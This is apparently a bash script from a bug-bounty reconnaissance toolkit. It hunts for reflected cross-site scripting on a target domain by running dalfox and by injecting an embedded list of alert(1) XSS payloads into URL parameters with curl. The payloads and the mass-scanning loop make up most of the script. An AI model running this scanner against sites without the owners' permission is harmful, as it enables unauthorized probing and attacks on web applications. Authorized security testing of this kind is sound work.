#!/bin/bash
# =============================================================================
# Automated XSS Hunting — dalfox + manual payloads on gf_xss.txt
#
# Usage:
#   ./tools/auto_xss.sh <domain>
#   ./tools/auto_xss.sh <domain> --gf-xss <gf_xss.txt>
# =============================================================================

set -euo pipefail

source "$(dirname "$0")/_env.sh"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BASE_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log_ok()   { echo -e "${GREEN}[+]${NC} $1"; }
log_err()  { echo -e "${RED}[-]${NC} $1" >&2; }
log_info() { echo -e "${CYAN}[*]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

TARGET="${1:?Usage: $0 <domain> [--gf-xss <file>]}"
GF_XSS="${3:-${RECON_BASE}/$TARGET/params/gf_xss.txt}"
OUT_DIR="${RECON_BASE}/$TARGET/xss"
mkdir -p "$OUT_DIR"

export PATH="$HOME/go/bin:/usr/local/bin:$PATH"

# ── Ensure dalfox is installed ──────────────────────────────────────
if ! command -v dalfox &>/dev/null; then
  log_info "Installing dalfox ..."
  go install github.com/hahwul/dalfox/v2@latest 2>/dev/null
  log_ok "dalfox installed"
fi

# ── Check input ─────────────────────────────────────────────────────
if [ ! -f "$GF_XSS" ] || [ ! -s "$GF_XSS" ]; then
  log_warn "gf_xss.txt not found or empty: $GF_XSS"
  log_info "Run param_extract.sh first"
  exit 0
fi

NURLS=$(wc -l < "$GF_XSS" | tr -d ' ')

# ── Pass 1: dalfox automated scan ───────────────────────────────────
log_info "Running dalfox on $NURLS XSS candidates ..."
dalfox file "$GF_XSS" \
  --mass-worker 10 \
  --concurrent 10 \
  --delay 500 \
  --output "$OUT_DIR/dalfox_results.txt" \
  --format plain \
  2>/dev/null

DALFOX_FOUND=0
if [ -f "$OUT_DIR/dalfox_results.txt" ]; then
  DALFOX_FOUND=$(wc -l < "$OUT_DIR/dalfox_results.txt" | tr -d ' ')
  log_ok "dalfox: $DALFOX_FOUND findings"
fi

# ── Pass 2: Manual payload test on each param URL ───────────────────
log_info "Testing manual XSS payloads on each parameter ..."

XSS_PAYLOADS="$BASE_DIR/scripts/xss_payloads.txt"
if [ ! -f "$XSS_PAYLOADS" ]; then
  log_info "xss_payloads.txt not found — testing with embedded payloads"
  XSS_PAYLOADS="$OUT_DIR/.embedded_payloads.txt"
  cat > "$XSS_PAYLOADS" << 'EOF'
<script>alert(1)</script>
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"onmouseover=alert(1)//
${alert(1)}
EOF
fi

NPAYLOADS=$(wc -l < "$XSS_PAYLOADS" | tr -d ' ')
MANUAL_FOUND=0

while IFS= read -r url; do
  [ -z "$url" ] && continue
  # Extract param name from last param in URL
  param=$(echo "$url" | grep -oP '[?&]\K[^=]+(?==[^&]*$|$)' | tail -1)
  [ -z "$param" ] && param="q"

  while IFS= read -r payload; do
    [ -z "$payload" ] && continue
    encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
    test_url=$(echo "$url" | sed "s|$param=[^&]*|$param=$encoded|" 2>/dev/null || echo "$url?$param=$encoded")

    response=$(curl -s -L -m 5 "$test_url" 2>/dev/null)
    if echo "$response" | grep -qi "alert(1)\|<script>alert\|onload=alert\|onerror=alert"; then
      echo "$test_url" >> "$OUT_DIR/manual_xss_found.txt"
      log_ok "  XSS: $test_url"
      MANUAL_FOUND=$((MANUAL_FOUND + 1))
      break
    fi
  done < "$XSS_PAYLOADS"
done < "$GF_XSS"

log_ok "Manual XSS: $MANUAL_FOUND confirmed"

# ── Summary ─────────────────────────────────────────────────────────
TOTAL=$((DALFOX_FOUND + MANUAL_FOUND))
log_ok "=== XSS Results ==="
log_ok "  dalfox: $DALFOX_FOUND findings → $OUT_DIR/dalfox_results.txt"
log_ok "  manual: $MANUAL_FOUND confirmed → $OUT_DIR/manual_xss_found.txt"
log_ok "  total:  $TOTAL"
